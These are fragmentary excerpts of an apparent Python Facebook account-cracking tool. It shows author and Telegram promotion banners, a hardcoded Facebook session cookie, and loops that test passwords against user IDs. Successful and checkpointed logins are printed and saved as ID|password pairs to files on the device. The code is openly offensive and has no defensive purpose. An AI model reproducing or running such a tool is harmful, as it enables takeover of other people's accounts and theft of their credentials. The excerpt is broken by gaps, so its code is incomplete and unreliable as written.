...
ha = current.day
today = date.today()
os.system('xdg-open https://t.me/+7A_-gDBfrG9hMWFl')
import os
...
os.system('espeak -a 300 " Welcome to the fuck Tools,"')
...
os.system('espeak -a 300 " Tool Owner Is  Md  Sojib"')
...
=================================================
\033[1;32m[✓]AUTHOR  :\033[1;32m SOJIB ISLAM
\033[1;32m[✓]TOOL    :\033[1;32m NEW 
\033[1;32m[✓]FACEBOOK:\033[1;32m SOJIBUL ISLAM AZAD
\033[1;32m[✓]VERSION :\033[1;32m 1.3
...
#____((𝑼𝑷𝑫𝑨𝑻𝑬-𝑺𝒀𝑺𝑻𝑬𝑴-Md Forid))            
            ...
            # 'cookie': 'ps_l=0; ps_n=0; datr=FnLxZT9xGzpiFpgM1eWrx_fp; sb=FnLxZRMs4yIlwdrp4edl0-CJ; locale=en_GB; vpd=v1%3B854x437x2.1042816638946533; dpr=2.1042816638946533; wl_cbv=v2%3Bclient_version%3A2438%3Btimestamp%3A1710751750; m_pixel_ratio=2.1042816638946533; wd=514x1004; fr=0VOkpaRX5P69BuLcS.AWVwdN4A7IDXjk9nNvw0SZ8oqxQ.Bl8XIW..AAA.0.0.Bl-ALm.AWUq8K9x7eM',
...
\033[38;5;46m❴\x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;46m𝘽𝙊𝙎𝙎 𝙀𝙈𝙍𝘼𝙉\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●❵
\033[38;5;46m┌════════════════════════════════════════════┐          
\033[33;1m     The fuck𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[38;5;46m❴𝙉𝙐𝙈𝘽𝙀𝙍❵\033[38;5;46m: {uid} 
\033[38;5;46m└════════════════════════════════════════════┘
\033[38;5;46m┌════════════════════════════════════════════┐
\033[33;1m     The fuck𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[38;5;46m❴𝙋𝘼𝙎𝙎𝙒𝙊𝙍𝘿❵ \033[38;5;46m: {ps}
\033[38;5;46m└════════════════════════════════════════════┘
""")
                import os
                cek_apk(session,coki)
                import os
                open('/sdcard/The fuck-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
...
\033[38;5;46m└════════════════════════════════════════════┘
""")
                open('/sdcard/\033[38;5;46mThe fuck-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        brand=random.choice(['fuck','fuck ','fuck '])
        ...
        sys.stdout.write(f"\r \33[1;90m[{colr}The fuck\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{len(oks)}\33[1;90m]-\33[1;90m[{emoji}]  "),
        sys.stdout.flush()
        sys.stdout.write(f'\r\r%s {x}[{xr}\033[38;5;46mfuck💥{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
